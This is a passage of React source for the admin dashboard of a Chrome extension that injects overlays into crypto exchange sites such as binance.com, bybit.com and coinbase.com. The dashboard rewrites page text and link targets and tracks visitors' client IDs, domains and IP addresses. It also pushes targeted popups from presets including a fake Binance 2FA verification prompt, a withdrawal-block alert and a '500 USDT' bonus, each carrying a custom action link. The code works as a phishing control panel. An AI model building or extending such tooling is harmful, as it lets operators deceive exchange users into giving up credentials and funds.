                            style={{ color: 'var(--brand-purple)', borderColor: 'var(--brand-purple)' }}
                          >
                            ⚡ Click to Load Sample Demo Rule
                          </button>
                        </div>
                      </td>
                    </tr>
                  ) : (
                    replacements.map((r) => (
                      <tr
                        key={r.id}
                        style={
                          editingRepId === r.id
                            ? {
                                background: '#f5f3ff',
                                borderLeft: '3px solid var(--brand-purple)',
                              }
                            : undefined
                        }
                      >
                        <td>
                          {r.enabled !== false ? (
                            <span className="badge badge-green" style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                              <span className="live-pulse-dot" /> Active Live
                            </span>
                          ) : (
                            <span className="badge badge-gold">
                              ⏸ Paused
                            </span>
                          )}
                        </td>
                        <td>
                          <span style={{ fontWeight: 700, color: 'var(--brand-purple)' }}>
                            🌐 {r.domain}
                          </span>
                        </td>
                        <td>
                          {r.targetClientId ? (
                            <span
                              className="badge badge-purple"
                              style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', fontSize: '11px', fontFamily: 'var(--font-mono)' }}
                              title={`Target Client ID: ${r.targetClientId}`}
                            >
                              <span>🎯</span>
                              <span>{r.targetClientId.length > 18 ? `${r.targetClientId.slice(0, 16)}...` : r.targetClientId}</span>
                            </span>
                          ) : (
                            <span
                              className="badge badge-green"
                              style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', fontSize: '11px' }}
                            >
                              <span>🌐</span>
                              <span>All Users (Global)</span>
                            </span>
                          )}
                        </td>
                        <td>
                          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                              <span style={{ background: '#fee2e2', color: '#991b1b', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontWeight: 600, maxWidth: '160px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.originalText}>
                                {r.originalText || '(any text)'}
                              </span>
                              <span style={{ fontWeight: 800, color: 'var(--text-secondary)' }}>➔</span>
                              <span style={{ background: '#dcfce7', color: '#166534', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontWeight: 700, maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.replacementText}>
                                {r.replacementText || '(text unchanged)'}
                              </span>
                            </div>
                            {r.replacementHref && (
                              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '11px' }}>
                                <span style={{ color: '#0369a1', fontWeight: 700 }}>🔗 Link:</span>
                                {r.originalHref && (
                                  <>
                                    <span style={{ background: '#e0f2fe', color: '#0369a1', padding: '1px 5px', borderRadius: '3px', maxWidth: '120px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.originalHref}>
                                      {r.originalHref}
                                    </span>
                                    <span style={{ color: '#0284c7', fontWeight: 800 }}>➔</span>
                                  </>
                                )}
                                <span style={{ background: '#dbeafe', color: '#1e40af', padding: '1px 6px', borderRadius: '3px', fontWeight: 700, maxWidth: '180px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={r.replacementHref}>
                                  {r.replacementHref}
                                </span>
                              </div>
                            )}
                          </div>
                        </td>
                        <td>
                          {r.selector ? (
                            <code style={{ fontSize: '11px', background: 'var(--bg-elevated)', padding: '2px 6px', borderRadius: '4px' }}>
                              {r.selector}
                            </code>
                          ) : (
                            <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Any element</span>
                          )}
                        </td>
                        <td style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                          {r.updatedAt ? new Date(r.updatedAt).toLocaleTimeString() : '—'}
                        </td>
                        <td style={{ textAlign: 'right' }}>
                          <div style={{ display: 'inline-flex', gap: '6px', alignItems: 'center' }}>
                            <button
                              type="button"
                              className="btn btn-secondary btn-sm"
                              onClick={() => handleEditReplacement(r)}
                              style={{
                                padding: '4px 10px',
                                fontSize: '11px',
                                fontWeight: 600,
                                borderColor: editingRepId === r.id ? 'var(--brand-purple)' : undefined,
                                background: editingRepId === r.id ? 'var(--brand-purple-subtle)' : undefined,
                                color: editingRepId === r.id ? 'var(--brand-purple)' : undefined,
                              }}
                              title="Edit this replacement rule"
                            >
                              ✏️ {editingRepId === r.id ? 'Editing...' : 'Edit'}
                            </button>
                            <button
                              type="button"
                              className={`btn btn-sm ${r.enabled !== false ? 'btn-secondary' : 'btn-primary'}`}
                              onClick={() => handleToggleReplacement(r.id, r.enabled !== false)}
                              style={{ padding: '4px 10px', fontSize: '11px' }}
                            >
                              {r.enabled !== false ? 'Pause' : 'Activate'}
                            </button>
                            <button
                              type="button"
                              className="btn btn-danger btn-sm"
                              onClick={() => handleDeleteReplacement(r.id)}
                              style={{ padding: '4px 10px', fontSize: '11px' }}
                              title="Delete this replacement rule"
                            >
                              🗑
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: Fullscreen Preview */}
      {activeTab === 'preview' && (
        <div className="card">
          <div className="card-header">
            <div>
              <h2 className="card-title">Fullscreen Live Interactive Preview</h2>
              <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                Simulating how the overlay renders in Chrome on <strong>{formData.domain}</strong> in real time.
              </p>
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <button className="btn btn-secondary btn-sm" onClick={() => setActiveTab('rules')}>
                ← Back to Visual Builder
              </button>
              <button className="btn btn-primary btn-sm" onClick={handleSaveRule} disabled={saving}>
                {saving ? '⏳ Saving...' : '💾 Save & Publish'}
              </button>
            </div>
          </div>

          {renderLiveCanvas(true)}
        </div>
      )}

      {/* TAB 3: Connected Clients, Broadcast Management & Instant Alert */}
      {activeTab === 'clients' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '22px' }}>
          {/* Section 1: Global Broadcasts Management & Disable Option */}
          <div className="card">
            <div className="card-header" style={{ marginBottom: '14px' }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
                  <h2 className="card-title" style={{ margin: 0 }}>📢 Global Broadcasts & Alert Control</h2>
                  <span className={broadcastsEnabled ? 'broadcast-badge-active' : 'broadcast-badge-disabled'}>
                    {broadcastsEnabled ? '● Broadcasts ACTIVE' : '✕ Broadcasts DISABLED'}
                  </span>
                </div>
                <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                  {broadcastsEnabled
                    ? 'Global broadcast alerts are active. Any alert dispatched without a specific client target will display on all extension clients.'
                    : 'Global broadcasts are currently DISABLED. Only direct 1-to-1 targeted alerts sent to specific Client IDs will display on screens.'}
                </p>
              </div>
              <div style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
                <button
                  type="button"
                  className={`btn btn-sm ${broadcastsEnabled ? 'btn-danger' : 'btn-primary'}`}
                  onClick={() => handleToggleBroadcasts(!broadcastsEnabled)}
                  disabled={broadcastLoading}
                  style={{ minWidth: '160px' }}
                >
                  {broadcastLoading
                    ? '⏳ Updating...'
                    : broadcastsEnabled
                      ? '⛔ Disable All Broadcasts'
                      : '✅ Enable Broadcast Delivery'}
                </button>
                <button
                  type="button"
                  className="btn btn-secondary btn-sm"
                  onClick={() => handleOpenAlertModalForClient(null)}
                >
                  📢 Dispatch New Broadcast
                </button>
              </div>
            </div>

            {/* Broadcast Details Banner */}
            <div
              style={{
                padding: '12px 18px',
                borderRadius: 'var(--radius-sm)',
                background: broadcastsEnabled ? 'var(--brand-green-bg)' : 'var(--brand-red-bg)',
                border: `1px solid ${broadcastsEnabled ? '#a7f3d0' : '#fecaca'}`,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                fontSize: '13px',
                color: broadcastsEnabled ? '#065f46' : '#991b1b',
              }}
            >
              <div>
                <strong>Current Broadcast Policy: </strong>
                {broadcastsEnabled ? (
                  <span>Broadcast delivery is enabled across all domains and clients.</span>
                ) : (
                  <span>All global broadcasts are blocked. Connected clients will strictly ignore broadcast alerts.</span>
                )}
              </div>
              <div style={{ fontWeight: 600 }}>
                Active Broadcast Messages: {broadcastsList.length}
              </div>
            </div>
          </div>

          {/* Section 2: Connected Browser Extension Clients (Always Live & Dynamic) */}
          <div className="card">
            <div className="card-header" style={{ marginBottom: '12px' }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
                  <h2 className="card-title" style={{ margin: 0 }}>👥 Connected Browser Extension Clients</h2>
                  <span className="badge badge-green" style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                    <span className="live-pulse-dot" />
                    {stats.onlineClients || 0} Online
                  </span>
                  <span className="badge badge-blue">
                    {stats.totalClients || clients.length} Registered
                  </span>
                </div>
                <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                  Live dynamic heartbeat monitor (auto-refreshing every 2.5s). Click <strong>&quot;Send Alert&quot;</strong> to target a specific user directly.
                </p>
              </div>
              <div style={{ display: 'flex', gap: '10px' }}>
                <button className="btn btn-secondary btn-sm" onClick={fetchClientsAndStats}>
                  🔄 Sync Now
                </button>
              </div>
            </div>

            {/* Clients Table with Live Status & Direct Action */}
            <div className="table-wrapper">
              <table className="data-table">
                <thead>
                  <tr>
                    <th>Live Status</th>
                    <th>Client ID</th>
                    <th>Current Domain</th>
                    <th>IP Address</th>
                    <th>Last Heartbeat</th>
                    <th style={{ textAlign: 'right' }}>Direct 1-to-1 Action</th>
                  </tr>
                </thead>
                <tbody>
                  {clients.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
                        No browser extension clients connected yet. Install the extension in Chrome to see live clients here.
                      </td>
                    </tr>
                  ) : (
                    clients.map((c) => (
                      <tr key={c.clientId}>
                        <td>
                          {c.isOnline || c.status === 'online' ? (
                            <span className="badge badge-green" style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                              <span className="live-pulse-dot" />
                              Online {c.secondsAgo <= 5 ? '(Just now)' : `(${c.secondsAgo}s ago)`}
                            </span>
                          ) : (
                            <span className="badge badge-gold" style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                              <span className="offline-dot" />
                              Offline {c.secondsAgo > 60 ? `(${Math.round(c.secondsAgo / 60)}m ago)` : `(${c.secondsAgo}s ago)`}
                            </span>
                          )}
                        </td>
                        <td>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <strong style={{ fontFamily: 'var(--font-mono)', fontSize: '13px' }}>{c.clientId}</strong>
                            <button
                              type="button"
                              onClick={() => {
                                navigator.clipboard.writeText(c.clientId);
                                showToast(`Copied ${c.clientId} to clipboard!`);
                              }}
                              style={{
                                background: 'transparent',
                                border: 'none',
                                cursor: 'pointer',
                                fontSize: '12px',
                                opacity: 0.6,
                              }}
                              title="Copy Client ID"
                            >
                              📋
                            </button>
                          </div>
                        </td>
                        <td>
                          <span style={{ fontWeight: 600, color: 'var(--brand-purple)' }}>
                            {c.domain || c.lastDomain || 'unknown'}
                          </span>
                        </td>
                        <td>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                            <span
                              style={{
                                fontFamily: 'var(--font-mono)',
                                fontSize: '12px',
                                background: '#f8fafc',
                                padding: '3px 8px',
                                borderRadius: '4px',
                                border: '1px solid #cbd5e1',
                                color: '#1e293b',
                                fontWeight: 600,
                                display: 'inline-flex',
                                alignItems: 'center',
                                gap: '5px',
                              }}
                            >
                              🌐 {c.ip || '127.0.0.1'}
                            </span>
                            <button
                              type="button"
                              onClick={() => {
                                navigator.clipboard.writeText(c.ip || '127.0.0.1');
                                showToast(`Copied IP ${c.ip || '127.0.0.1'} to clipboard!`);
                              }}
                              style={{
                                background: 'transparent',
                                border: 'none',
                                cursor: 'pointer',
                                fontSize: '11px',
                                opacity: 0.6,
                              }}
                              title="Copy Client IP"
                            >
                              📋
                            </button>
                          </div>
                        </td>
                        <td style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
                          {c.lastSeen ? new Date(c.lastSeen).toLocaleTimeString() : '—'}
                        </td>
                        <td style={{ textAlign: 'right' }}>
                          <div style={{ display: 'inline-flex', gap: '8px', alignItems: 'center' }}>
                            <button
                              type="button"
                              className="client-alert-btn"
                              onClick={() => handleOpenAlertModalForClient(c)}
                              title={`Send direct live popup alert ONLY to ${c.clientId}`}
                            >
                              <span>🔔</span>
                              <span>Send Alert</span>
                            </button>
                            <button
                              type="button"
                              className="btn btn-danger btn-sm"
                              onClick={() => handleDeleteClient(c.clientId)}
                              title={`Delete client ${c.clientId} from records`}
                              style={{ padding: '5px 10px', fontSize: '12px' }}
                            >
                              🗑 Delete
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>

          {/* Section 3: Active Dispatched Alerts Monitor */}
          <div className="card">
            <div className="card-header">
              <div>
                <h3 className="card-title">🚀 Currently Dispatched Alerts & Broadcasts</h3>
                <p style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
                  These alerts are actively showing on connected client screens. Click <strong>&quot;Cancel Alert&quot;</strong> to dismiss them immediately.
                </p>
              </div>
            </div>

            {messages.length === 0 ? (
              <div style={{ padding: '24px', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '13px' }}>
                No active dispatched alerts. Click &quot;Send Alert&quot; on any client above to dispatch an alert.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {messages.map((m) => (
                  <div
                    key={m.id}
                    style={{
                      padding: '16px 20px',
                      background: 'var(--bg-elevated)',
                      border: '1px solid var(--border-subtle)',
                      borderRadius: 'var(--radius-md)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      gap: '16px',
                    }}
                  >
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '6px' }}>
                        <span
                          style={{
                            fontWeight: 700,
                            fontSize: '14px',
                            color: m.colorTitle || 'var(--brand-gold)',
                          }}
                        >
                          {m.title}
                        </span>
                        {m.targetClientId ? (
                          <span className="badge badge-blue">🎯 DIRECT TO: {m.targetClientId}</span>
                        ) : (
                          <span className="badge badge-gold">📢 GLOBAL BROADCAST</span>
                        )}
                        {!m.targetClientId && !broadcastsEnabled && (
                          <span className="badge badge-danger">⏸ Paused (Broadcasts Disabled)</span>
                        )}
                        {m.targetClientId && (
                          <span style={{ fontSize: '11px', color: '#16a34a', fontWeight: 600 }}>
                            ● Only visible to {m.targetClientId}
                          </span>
                        )}
                        <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
                          {new Date(m.createdAt).toLocaleTimeString()}
                        </span>
                      </div>
                      <div
                        style={{ fontSize: '13px', color: 'var(--text-secondary)' }}
                        dangerouslySetInnerHTML={{ __html: m.body }}
                      />
                    </div>

                    <button
                      type="button"
                      className="btn btn-danger btn-sm"
                      onClick={() => handleDeleteAlertMessage(m.id)}
                    >
                      ✕ Cancel Alert
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 4: Admin Profile & Security Settings */}
      {activeTab === 'settings' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '22px', maxWidth: '840px', margin: '0 auto' }}>
          <div className="card">
            <div className="card-header" style={{ marginBottom: '18px' }}>
              <div>
                <h2 className="card-title">👤 Admin Profile & Security Settings</h2>
                <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
                  Update your administrative email and password stored securely.
                </p>
              </div>
            </div>

            <form onSubmit={handleUpdateProfile} style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>
              <div className="form-group" style={{ marginBottom: 0 }}>
                <label className="form-label" style={{ fontWeight: 600 }}>Admin Display Name</label>
                <input
                  type="text"
                  className="form-input"
                  value={profileForm.name}
                  onChange={(e) => setProfileForm({ ...profileForm, name: e.target.value })}
                  placeholder="Super Admin"
                  required
                />
              </div>

              <div className="form-group" style={{ marginBottom: 0 }}>
                <label className="form-label" style={{ fontWeight: 600 }}>Admin Email Address</label>
                <input
                  type="email"
                  className="form-input"
                  value={profileForm.email}
                  onChange={(e) => setProfileForm({ ...profileForm, email: e.target.value })}
                  placeholder="Enter admin email"
                  required
                />
                <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
                  This email is used to log into the admin portal.
                </span>
              </div>

              <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '18px', marginTop: '6px' }}>
                <h3 style={{ fontSize: '15px', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '4px' }}>
                  🔐 Change Password
                </h3>
                <p style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '16px' }}>
                  Leave password fields blank if you only wish to change your email address.
                </p>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
                  <div className="form-group" style={{ marginBottom: 0 }}>
                    <label className="form-label">Current Password (Required for changes)</label>
                    <input
                      type="password"
                      className="form-input"
                      value={profileForm.currentPassword}
                      onChange={(e) => setProfileForm({ ...profileForm, currentPassword: e.target.value })}
                      placeholder="Enter current password"
                    />
                  </div>

                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '14px' }}>
                    <div className="form-group" style={{ marginBottom: 0 }}>
                      <label className="form-label">New Password</label>
                      <input
                        type="password"
                        className="form-input"
                        value={profileForm.newPassword}
                        onChange={(e) => setProfileForm({ ...profileForm, newPassword: e.target.value })}
                        placeholder="At least 6 characters"
                      />
                    </div>
                    <div className="form-group" style={{ marginBottom: 0 }}>
                      <label className="form-label">Confirm New Password</label>
                      <input
                        type="password"
                        className="form-input"
                        value={profileForm.confirmPassword}
                        onChange={(e) => setProfileForm({ ...profileForm, confirmPassword: e.target.value })}
                        placeholder="Confirm new password"
                      />
                    </div>
                  </div>
                </div>
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', marginTop: '12px' }}>
                <button
                  type="submit"
                  className="btn btn-primary"
                  disabled={profileSaving}
                  style={{ padding: '12px 28px', fontSize: '14px', fontWeight: 700 }}
                >
                  {profileSaving ? '⏳ Saving Changes...' : '💾 Save Profile & Password'}
                </button>
              </div>
            </form>

            {/* Database Security Info Box */}

          </div>
        </div>
      )}

      {/* TAB 5: Documentation & Setup Guide */}
      {activeTab === 'docs' && (
        <div className="card">
          <div className="card-header">
            <h2 className="card-title">Chrome Extension & Next.js Setup Guide</h2>
          </div>

          <div style={{ fontSize: '14px', lineHeight: '1.7', color: 'var(--text-primary)' }}>
            <h3 style={{ color: 'var(--brand-purple)', marginBottom: '8px' }}>1. How to Load the Extension in Google Chrome</h3>
            <ol style={{ paddingLeft: '20px', marginBottom: '20px', color: 'var(--text-secondary)' }}>
              <li>Open Google Chrome and navigate to <code>chrome://extensions</code>.</li>
              <li>Toggle <strong>Developer mode</strong> ON (top right corner).</li>
              <li>Click <strong>Load unpacked</strong>.</li>
              <li>Select your extension folder: <code>d:\binance_modify\extension</code>.</li>
              <li>Browse to <code>binance.com</code> — your dynamic overlay will inject immediately!</li>
            </ol>

            <h3 style={{ color: 'var(--brand-purple)', marginBottom: '8px' }}>2. Direct Client Alerts</h3>
            <p style={{ color: 'var(--text-secondary)', marginBottom: '14px' }}>
              In the <strong>Connected Clients</strong> tab, every user currently visiting your target domains appears with their unique Client ID. Click <strong>&quot;Send Alert&quot;</strong> to immediately display a tailored popup alert on their browser with zero delay.
            </p>
          </div>
        </div>
      )}

      {/* ==========================================================================
          MODAL 1: ADD NEW DOMAIN RULE (Clean, Simple, Not Confusing)
          ========================================================================== */}
      {showAddDomainModal && (
        <div className="modal-backdrop" onClick={() => setShowAddDomainModal(false)}>
          <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <div className="modal-title">
                <span>➕</span>
                <span>Add Target Website Domain</span>
              </div>
              <button
                type="button"
                className="modal-close-btn"
                onClick={() => setShowAddDomainModal(false)}
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleCreateNewDomainRule}>
              <div className="modal-body">
                <div>
                  <label className="form-label">Domain Name (Website where popup should appear):</label>
                  <input
                    type="text"
                    className="form-input"
                    value={newDomainInput}
                    onChange={(e) => setNewDomainInput(e.target.value)}
                    placeholder="e.g. bybit.com, binance.com, okx.com or *"
                    autoFocus
                    required
                  />

                  {/* 1-Click Popular Domain Suggestions */}
                  <div style={{ marginTop: '8px' }}>
                    <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Suggestions:</span>
                    <div className="quick-chips-row">
                      {['binance.com', 'bybit.com', 'coinbase.com', 'okx.com', 'kraken.com', '*'].map((d) => (
                        <button
                          key={d}
                          type="button"
                          className="quick-chip"
                          onClick={() => setNewDomainInput(d)}
                        >
                          {d === '*' ? '★ All Websites (*)' : d}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Initial Template Choice */}
                <div>
                  <label className="form-label">Select Initial Popup Template:</label>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
                    {[
                      { id: 'binance', title: '🟡 Security Notice', desc: 'Binance 2FA verification prompt' },
                      { id: 'withdrawal', title: '🔴 Withdrawal Block', desc: 'Urgent paused withdrawal alert' },
                      { id: 'bonus', title: '🟢 500 USDT Voucher', desc: 'Trading rebate reward card' },
                      { id: 'blank', title: '⚪ Blank Popup', desc: 'Empty canvas to build custom' },
                    ].map((tpl) => (
                      <div
                        key={tpl.id}
                        onClick={() => setNewDomainTemplate(tpl.id)}
                        style={{
                          padding: '12px',
                          borderRadius: '8px',
                          border: `2px solid ${newDomainTemplate === tpl.id ? 'var(--brand-purple)' : 'var(--border-subtle)'}`,
                          background: newDomainTemplate === tpl.id ? 'var(--brand-purple-subtle)' : '#ffffff',
                          cursor: 'pointer',
                          transition: 'all 0.15s ease',
                        }}
                      >
                        <div style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>{tpl.title}</div>
                        <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px' }}>{tpl.desc}</div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              <div className="modal-footer">
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={() => setShowAddDomainModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="btn btn-primary"
                  disabled={saving}
                >
                  {saving ? '⏳ Creating...' : '🚀 Create Domain Rule'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ==========================================================================
          MODAL 2: SEND DIRECT ALERT TO CLIENT (With LIVE UI DESIGN PREVIEW)
          ========================================================================== */}
      {showAlertModal && (
        <div className="modal-backdrop" onClick={() => setShowAlertModal(false)}>
          <div className="modal-dialog" style={{ maxWidth: '680px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <div>
                <div className="modal-title">
                  <span>🔔</span>
                  <span>
                    {alertTargetClient
                      ? `Send Direct Alert to ${alertTargetClient.clientId}`
                      : 'Broadcast Alert to All Connected Clients'}
                  </span>
                </div>
                {alertTargetClient && (
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span>Currently browsing: <strong>{alertTargetClient.domain || 'unknown website'}</strong></span>
                    <span>•</span>
                    <span>IP Address: <strong style={{ color: 'var(--brand-purple)', fontFamily: 'var(--font-mono)' }}>{alertTargetClient.ip || '127.0.0.1'}</strong></span>
                  </div>
                )}
              </div>
              <button
                type="button"
                className="modal-close-btn"
                onClick={() => setShowAlertModal(false)}
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleSendDirectAlert}>
              <div className="modal-body">
                {/* Strict Targeting Notice Banner */}
                {alertTargetClient ? (
                  <div
                    style={{
                      background: '#eff6ff',
                      border: '1px solid #bfdbfe',
                      borderRadius: '8px',
                      padding: '10px 14px',
                      fontSize: '13px',
                      color: '#1e40af',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '10px',
                    }}
                  >
                    <span style={{ fontSize: '18px' }}>🎯</span>
                    <div>
                      <strong>Strict 1-to-1 Client Isolation:</strong> This popup will be sent <strong>EXCLUSIVELY</strong> to client <code>{alertTargetClient.clientId}</code>. No other client will ever see this alert.
                    </div>
                  </div>
                ) : (
                  <div
                    style={{
                      background: broadcastsEnabled ? '#fffbeb' : '#fef2f2',
                      border: `1px solid ${broadcastsEnabled ? '#fde68a' : '#fecaca'}`,
                      borderRadius: '8px',
                      padding: '10px 14px',
                      fontSize: '13px',
                      color: broadcastsEnabled ? '#92400e' : '#991b1b',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '10px',
                    }}
                  >
                    <span style={{ fontSize: '18px' }}>📢</span>
                    <div>
                      <strong>Global Broadcast Alert:</strong> This alert will be broadcast to <strong>ALL connected clients</strong> across all websites.
                      {!broadcastsEnabled && (
                        <div style={{ fontWeight: 700, marginTop: '2px', color: '#dc2626' }}>
                          ⚠️ Note: Global broadcasts are currently DISABLED in settings.
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* 1-Click Alert Presets */}
                <div>
                  <label className="form-label">1-Click Alert Presets:</label>
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '6px' }}>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('withdrawal')}
                    >
                      🚨 Withdrawal Block
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('verification')}
                    >
                      ⚠️ 2FA Verify
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('reward')}
                    >
                      🎁 500 USDT Bonus
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{ textAlign: 'center', padding: '6px 4px' }}
                      onClick={() => handleApplyAlertTemplate('session')}
                    >
                      ⏳ Timeout
                    </button>
                  </div>
                </div>

                {/* Form Fields: Title & Message */}
                <div className="form-group" style={{ marginBottom: '8px' }}>
                  <label className="form-label">Alert Title:</label>
                  <input
                    type="text"
                    className="form-input"
                    value={alertForm.title}
                    onChange={(e) => setAlertForm({ ...alertForm, title: e.target.value })}
                    required
                  />
                </div>

                <div className="form-group" style={{ marginBottom: '8px' }}>
                  <label className="form-label">Alert Message Details:</label>
                  <textarea
                    className="form-textarea"
                    rows={2}
                    value={alertForm.body}
                    onChange={(e) => setAlertForm({ ...alertForm, body: e.target.value })}
                    required
                  />
                </div>

                {/* Button & Link */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginBottom: '8px' }}>
                  <div>
                    <label className="form-label">Button Label:</label>
                    <input
                      type="text"
                      className="form-input"
                      value={alertForm.ctaText}
                      onChange={(e) => setAlertForm({ ...alertForm, ctaText: e.target.value })}
                    />
                  </div>
                  <div>
                    <label className="form-label">Action Link URL:</label>
                    <input
                      type="text"
                      className="form-input"
                      value={alertForm.ctaUrl}
                      onChange={(e) => setAlertForm({ ...alertForm, ctaUrl: e.target.value })}
                    />
                  </div>
                </div>

                {/* Color Variant & Position */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginBottom: '8px' }}>
                  <div>
                    <label className="form-label">Color Style:</label>
                    <div style={{ display: 'flex', gap: '6px' }}>
                      {[
                        { id: 'danger', label: '🔴 Red', color: '#ef4444' },
                        { id: 'warning', label: '🟡 Gold', color: '#f0b90b' },
                        { id: 'success', label: '🟢 Green', color: '#10b981' },
                        { id: 'info', label: '🔵 Blue', color: '#3b82f6' },
                      ].map((v) => (
                        <button
                          key={v.id}
                          type="button"
                          className="quick-chip"
                          style={{
                            flex: 1,
                            textAlign: 'center',
                            borderWidth: alertForm.variant === v.id ? '2px' : '1px',
                            borderColor: alertForm.variant === v.id ? v.color : 'var(--border-light)',
                            fontWeight: alertForm.variant === v.id ? 700 : 500,
                          }}
                          onClick={() => setAlertForm({ ...alertForm, variant: v.id })}
                        >
                          {v.label}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div>
                    <label className="form-label">Placement:</label>
                    <div style={{ display: 'flex', gap: '6px' }}>
                      <button
                        type="button"
                        className="quick-chip"
                        style={{
                          flex: 1,
                          textAlign: 'center',
                          borderWidth: alertForm.position === 'center' ? '2px' : '1px',
                          borderColor: alertForm.position === 'center' ? 'var(--brand-purple)' : 'var(--border-light)',
                        }}
                        onClick={() => setAlertForm({ ...alertForm, position: 'center' })}
                      >
                        🗖 Center Modal
                      </button>
                      <button
                        type="button"
                        className="quick-chip"
                        style={{
                          flex: 1,
                          textAlign: 'center',
                          borderWidth: alertForm.position === 'top' ? '2px' : '1px',
                          borderColor: alertForm.position === 'top' ? 'var(--brand-purple)' : 'var(--border-light)',
                        }}
                        onClick={() => setAlertForm({ ...alertForm, position: 'top' })}
                      >
                        ⬆ Top Banner
                      </button>
                    </div>
                  </div>
                </div>

                {/* LIVE UI DESIGN PREVIEW (Right inside the modal) */}
                <div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <label className="form-label">Live UI Preview (How it looks on client&apos;s screen):</label>
                    <span style={{ fontSize: '10px', color: 'var(--brand-green)', fontWeight: 700 }}>● Instant Live Simulation</span>
                  </div>

                  {(() => {
                    const variantColor =
                      alertForm.variant === 'danger'
                        ? '#ef4444'
                        : alertForm.variant === 'success'
                          ? '#10b981'
                          : alertForm.variant === 'info'
                            ? '#3b82f6'
                            : '#f0b90b';

                    const isTop = alertForm.position === 'top';

                    return (
                      <div
                        style={{
                          background: '#090b0e',
